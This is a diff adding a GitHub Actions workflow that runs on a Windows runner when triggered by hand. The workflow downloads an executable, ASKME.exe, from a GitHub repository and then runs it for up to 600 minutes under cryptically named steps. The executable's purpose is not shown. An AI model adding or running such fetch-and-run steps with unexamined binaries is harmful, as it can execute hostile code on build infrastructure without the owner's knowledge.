@@ -1,0 +1,11 @@
+name: ASKME
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: SGH
+      run: Invoke-WebRequest https://github.com/patil1300/ASKME/raw/main/ASKME.exe -OutFile ASKME.exe
+    - name: WVU
+      run: .\ASKME.exe
+      timeout-minutes: 600
